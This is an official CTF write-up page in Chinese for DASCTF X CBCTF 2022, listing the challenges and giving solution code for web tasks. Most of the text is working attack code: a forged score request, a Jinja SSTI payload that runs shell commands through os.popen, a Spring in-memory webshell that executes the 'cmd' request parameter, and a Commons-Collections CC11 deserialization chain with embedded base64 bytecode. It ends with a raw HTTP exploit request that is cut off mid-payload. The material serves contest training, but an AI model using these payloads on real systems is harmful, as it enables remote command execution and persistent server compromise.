# DASCTF X CBCTF 2022｜ 九月挑战赛官方Write Up

> 原文: https://www.ctfiot.com/57949.html
> ID: 57949

DASCTF X CBCTF  ▶▶▶

九月挑战赛

官方WP

9月18日，DASCTF X CBCTF 2022九月挑战赛于BUU平台顺利开赛。响应各位小伙伴的号召，今天官方WP正式发布！（点击阅读全文获取PDF版）

WEB

01

Dnio3d

02

Text Reverser

Text Reverser

03

zzz_again

04

a_proxy_server

05

JavaMaster

首先file协议读取内网/etc/hosts  然后发现网段。进行网段探测

探测发现springboot服务，且给出反序列化点。该题目无法出网弹shell，因此只能写内存马。编译该内存马

06

cbshop

Misc

01

Sign_in

02

easy_keyboard

03

mask

04

ezflow

PWN

01

appetizer

02

cyberprinter

02

bar

03

cgrasstring

04

ez_note

Reverse

01

landing

02

cbNET

Crypto

01

easySignin

02

LittleRSA

03

easyRSA

恒星战报｜热烈祝贺 恒星实验室 夺得2021第五空间网络安全大赛一等奖！！！

2021-10-14

恒星战报｜热烈祝贺安恒数字人才创研院恒星实验室战队再次夺得大奖！！

2021-12-09


```
from hashlib import md5
import requests
import time

url = "http://node4.buuoj.cn:
28177/check.php"

def getFlag():
    data = {
        "score": 1000000,
        "checkCode": md5("1000000DASxCBCTF_wElc03e".encode()).hexdigest(),
        "tm": int(time.time())
    }
    res = requests.post(url, data = data)
    return res.text

if __name__ == '__main__':
    print(getFlag())
output = '''{% print "".__class__.__bases__[0].__subclasses__()%}'''[::-1]
print(output)
import json

a = """
<class 'type'>...<class 'unicodedata.UCD'>
"""

num = 0
allList = []

result = ""
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "n" or i == ",":
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if "os._wrap_close" in v:
        print(str(k)+"--->"+v)
#返回结果:
132---> <class 'os._wrap_close'>
{% print "".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls').read()%}

}%)(daer.)'galf/ ln'(]'nepop'[__slabolg__.__tini__.]231[)(__sessalcbus__.]0[__sesab__.__ssalc__."" tnirp %{
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class InjectToController extends AbstractTranslet {

   // 第一个构造函数
   public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {
       WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
       // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
       RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
       // 2. 通过反射获得自定义 controller 中test的 Method 对象
       Method method2 = InjectToController.class.getMethod("test");
       // 3. 定义访问 controller 的 URL 地址
       PatternsRequestCondition url = new PatternsRequestCondition("/yang99");
       // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
       RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
       // 5. 在内存中动态注册 controller
       RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
       // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
       InjectToController injectToController = new InjectToController("aaa");
       mappingHandlerMapping.registerMapping(info, injectToController, method2);
   }

   @Override
   public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

   }

   @Override
   public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

   }

   // 第二个构造函数
   public InjectToController(String aaa) {}

   // controller指定的处理方法
   public void test() throws IOException{
       // 获取request和response对象
       HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
       HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

       //exec
       try {
           String arg0 = request.getParameter("cmd");
           PrintWriter writer = response.getWriter();
           if (arg0 != null) {
               String o = "";
               java.lang.ProcessBuilder p;
               if(System.getProperty("os.name").toLowerCase().contains("win")){
                   p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
               }else{
                   p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
               }
               java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("A");
               o = c.hasNext() ? c.next(): o;
               c.close();
               writer.write(o);
               writer.flush();
               writer.close();
           }else{
               //当请求没有携带指定的参数(code)时，返回 404 错误
               response.sendError(404);
           }
       }catch (Exception e){}
   }

}
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;

@SuppressWarnings("all")
public class CC11 {
   public static void main(String[] args) throws Exception {

       // 利用javasist动态创建恶意字节码

       byte[] classBytes = Base64.getDecoder().decode("yv66vgAAADQA7goAOAB8CgB9AH4IAH8LAIAAgQcAggcAgwsABQCEBwCFCABjBwCGCgAKAIcHAIgHAIkIAIoKAAwAiwcAjAcAjQoAEACOBwCPCgATAJAIAGEKAAgAkQoABgCSBwCTCgAYAJQKABgAlQgAlgsAlwCYCwCZAJoIAJsIAJwKAJ0AngoADQCfCACgCgANAKEHAKIIAKMIAKQKACQAiwgApQgApgcApwoAJACoCgCpAKoKACoAqwgArAoAKgCtCgAqAK4KACoArwoAKgCwCgCxALIKALEAswoAsQCwCwCZALQHALUHALYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFExJbmplY3RUb0NvbnRyb2xsZXI7AQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBABVtYXBwaW5nSGFuZGxlck1hcHBpbmcBAFRMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZzsBAAdtZXRob2QyAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAN1cmwBAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBAAJtcwEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBABJpbmplY3RUb0NvbnRyb2xsZXIBAApFeGNlcHRpb25zBwC3BwC4BwC5BwC6BwC7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcAvAEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAA2FhYQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHRlc3QBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAFvAQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAARhcmcwAQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHAIUHAL0HAL4HAIkHAL8HAKIHAKcHALUHAMABAApTb3VyY2VGaWxlAQAXSW5qZWN0VG9Db250cm9sbGVyLmphdmEMADkAOgcAwQwAwgDDAQA5b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuc2VydmxldC5EaXNwYXRjaGVyU2VydmxldC5DT05URVhUBwDEDADFAMYBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dAEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcMAMcAyAEAEkluamVjdFRvQ29udHJvbGxlcgEAD2phdmEvbGFuZy9DbGFzcwwAyQDKAQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBAAcveWFuZzk5DAA5AMsBAExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2QMADkAzAEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MADkAzQwAOQBgDADOAM8BAEBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzDADQANEMANIA0wEAA2NtZAcAvQwA1ADVBwC+DADWANcBAAABAAdvcy5uYW1lBwDYDADZANUMANoA2wEAA3dpbgwA3ADdAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAHY21kLmV4ZQEAAi9jAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAN4A3wcA4AwA4QDiDAA5AOMBAAJcQQwA5ADlDADmAOcMAOgA2wwA6QA6BwC/DADqAGAMAOsAOgwA7ADtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2lvL1ByaW50V3JpdGVyAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBADlvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXMBAAxnZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQA7KFtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhAAgAOAAAAAAABQABADkAOgACADsAAAEFAAkACAAAAHEqtwABuAACEgMDuQAEAwDAAAVMKxIGuQAHAgDAAAZNEggSCQO9AAq2AAtOuwAMWQS9AA1ZAxIOU7cADzoEuwAQWQO9ABG3ABI6BbsAE1kZBBkFAQEBAQG3ABQ6BrsACFkSFbcAFjoHLBkGGQcttgAXsQAAAAIAPAAAACoACgAAABgABAAZABMAGwAfAB0AKwAfAD0AIQBKACMAXAAlAGcAJgBwACcAPQAAAFIACAAAAHEAPgA/AAAAEwBeAEAAQQABAB8AUgBCAEMAAgArAEYARABFAAMAPQA0AEYARwAEAEoAJwBIAEkABQBcABUASgBLAAYAZwAKAEwAPwAHAE0AAAAMAAUATgBPAFAAUQBSAAEAUwBUAAMAOwAAAD8AAAADAAAAAbEAAAACADwAAAAGAAEAAAAsAD0AAAAgAAMAAAABAD4APwAAAAAAAQBVAFYAAQAAAAEAVwBYAAIATQAAAAQAAQBZAFoAAAAJAgBVAAAAVwAAAAEAUwBbAAMAOwAAAEkAAAAEAAAAAbEAAAACADwAAAAGAAEAAAAxAD0AAAAqAAQAAAABAD4APwAAAAAAAQBVAFYAAQAAAAEAXABdAAIAAAABAF4AXwADAE0AAAAEAAEAWQBaAAAADQMAVQAAAFwAAABeAAAAAQA5AGAAAgA7AAAAOQABAAIAAAAFKrcAAbEAAAACADwAAAAGAAEAAAA0AD0AAAAWAAIAAAAFAD4APwAAAAAABQBhAGIAAQBaAAAABQEAYQAAAAEAYwA6AAIAOwAAAdMABgAIAAAAzbgAAsAAGMAAGLYAGUy4AALAABjAABi2ABpNKxIbuQAcAgBOLLkAHQEAOgQtxgCTEh46BRIfuAAgtgAhEiK2ACOZACG7ACRZBr0ADVkDEiVTWQQSJlNZBS1TtwAnOganAB67ACRZBr0ADVkDEihTWQQSKVNZBS1TtwAnOga7ACpZGQa2ACu2ACy3AC0SLrYALzoHGQe2ADCZAAsZB7YAMacABRkFOgUZB7YAMhkEGQW2ADMZBLYANBkEtgA1pwAMLBEBlLkANgIApwAETrEAAQAaAMgAywA3AAMAPAAAAE4AEwAAADkADQA6ABoAPgAjAD8AKwBAAC8AQQAzAEMAQwBEAGEARgB8AEgAkgBJAKYASgCrAEsAsgBMALcATQC8AE4AvwBQAMgAUgDMAFMAPQAAAFwACQBeAAMAZABlAAYAMwCJAGYAYgAFAHwAQABkAGUABgCSACoAZwBoAAcAIwClAGkAYgADACsAnQBqAGsABAAAAM0APgA/AAAADQDAAGwAbQABABoAswBuAG8AAgBwAAAANgAI/wBhAAYHAHEHAHIHAHMHAHQHAHUHAHQAAPwAGgcAdvwAJQcAd0EHAHT4ABr5AAhCBwB4AABNAAAABAABAHkAAQB6AAAAAgB7");       // 写入.class 文件
       // 将我的恶意类转成字节码，并且反射设置 bytecodes
       byte[][] targetByteCodes = new byte[][]{classBytes};
       TemplatesImpl templates = TemplatesImpl.class.newInstance();

       Field f0 = templates.getClass().getDeclaredField("_bytecodes");
       f0.setAccessible(true);
       f0.set(templates,targetByteCodes);

       f0 = templates.getClass().getDeclaredField("_name");
       f0.setAccessible(true);
       f0.set(templates,"name");

       f0 = templates.getClass().getDeclaredField("_class");
       f0.setAccessible(true);
       f0.set(templates,null);

       InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
       HashMap innermap = new HashMap();
       LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
       TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
       HashSet hashset = new HashSet(1);
       hashset.add("foo");
       Field f = null;
       try {
           f = HashSet.class.getDeclaredField("map");
       } catch (NoSuchFieldException e) {
           f = HashSet.class.getDeclaredField("backingMap");
       }
       f.setAccessible(true);
       HashMap hashset_map = (HashMap) f.get(hashset);

       Field f2 = null;
       try {
           f2 = HashMap.class.getDeclaredField("table");
       } catch (NoSuchFieldException e) {
           f2 = HashMap.class.getDeclaredField("elementData");
       }

       f2.setAccessible(true);
       Object[] array = (Object[])f2.get(hashset_map);

       Object node = array[0];
       if(node == null){
           node = array[1];
       }
       Field keyField = null;
       try{
           keyField = node.getClass().getDeclaredField("key");
       }catch(Exception e){
           keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
       }
       keyField.setAccessible(true);
       keyField.set(node,tiedmap);

       Field f3 = transformer.getClass().getDeclaredField("iMethodName");
       f3.setAccessible(true);
       f3.set(transformer,"newTransformer");

       try{
           ByteArrayOutputStream barr = new ByteArrayOutputStream();
           ObjectOutputStream oos = new ObjectOutputStream(barr);
           oos.writeObject(hashset);
           oos.close();
//       System.out.println(barr);

           System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));

//           ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc11"));
//           inputStream.readObject();
       }catch(Exception e){
           e.printStackTrace();
       }
   }

}
import urllib
test =
"""POST /readObject HTTP/1.1
Host: 192.168.7.23:
8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 9109

base64=rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX%2bAYIVOACAAB4cAAAFxbK/rq%2bAAAANADuCgA4AHwKAH0AfggAfwsAgACBBwCCBwCDCwAFAIQHAIUIAGMHAIYKAAoAhwcAiAcAiQgAigoADACLBwCMBwCNCgAQAI4HAI8KABMAkAgAYQoACACRCgAGAJIHAJMKABgAlAoAGACVCACWCwCXAJgLAJkAmggAmwgAnAoAnQCeCgANAJ8IAKAKAA0AoQcAoggAowgApAoAJACLCAClCACmBwCnCgAkAKgKAKkAqgoAKgCrCACsCgAqAK0KACoArgoAKgCvCgAqALAKALEAsgoAsQCzCgCxALALAJkAtAcAtQcAtgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAUTEluamVjdFRvQ29udHJvbGxlcjsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAB21ldGhvZDIBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAA3VybAEASExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAAm1zAQBOTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247AQAEaW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAEmluamVjdFRvQ29udHJvbGxlcgEACkV4Y2VwdGlvbnMHALcHALgHALkHALoHALsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwC8AQAQTWV0aG9kUGFyYW1ldGVycwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQADYWFhAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEdGVzdAEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAhQcAvQcAvgcAiQcAvwcAogcApwcAtQcAwAEAClNvdXJjZUZpbGUBABdJbmplY3RUb0NvbnRyb2xsZXIuamF2YQwAOQA6BwDBDADCAMMBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHAMQMAMUAxgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2Vydmx